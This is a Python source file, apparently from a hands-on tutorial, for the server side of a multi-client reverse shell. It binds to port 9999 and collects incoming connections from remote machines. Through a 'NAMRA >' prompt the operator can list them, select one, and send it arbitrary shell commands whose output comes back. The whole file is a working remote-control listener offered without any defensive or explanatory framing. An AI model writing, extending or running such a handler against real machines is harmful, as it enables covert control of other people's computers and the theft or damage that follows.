import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS =2
JOB_NUMBER=[1,2]
queue =Queue()
all_connection=[]
all_address=[]

def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port= 9999
        s=socket.socket()

    except socket.error as msg:
        print("socket creation error : " +str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port : " +str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error " +str(msg) + "\n"+ "Retrying..")
        bind_socket()

def accepting_connection():
    for c in all_connection:
        c.close()

    del all_address[:]
    del all_connection[:]

    while True:
        try :
            conn, address=s.accept()
            s.setblocking(1)
            all_connection.append(conn)
            all_address.append(address)
            print("connection has been established "+address[0])

        except:
            print("error acception connection ")


def start_turtle():
    while True:
        cmd = input('NAMRA >')
        if cmd =='list':
            list_connection()

        elif 'select' in cmd:
            conn= get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("command is not recognized ")


def list_connection():
    results=''
    for i, conn in enumerate(all_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(20482048)

        except:
            del all_connection[i]
            del all_address[i]
            continue

        result =str(i) + "  " + str(all_address[i][0]) + " " +str(all_address[i][1])+ "\n"

        print("----CLIENT-----"+"\n" +result)

def get_target(cmd):
    try:
        target= cmd.replace('select ','')
        target=int(target)
        conn=all_connection[target]
        print("You are now connected to : "+str(all_address[target][0]))
        print(str(all_address[target][0]) +">", end ="")
        return conn


    except:
        print("selection is not valid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd =='quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_respose=str(conn.recv(2048),"utf-8")
                print(client_respose,end="")
        except:
            print("error sending commands")
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()

def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()

        if x==2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
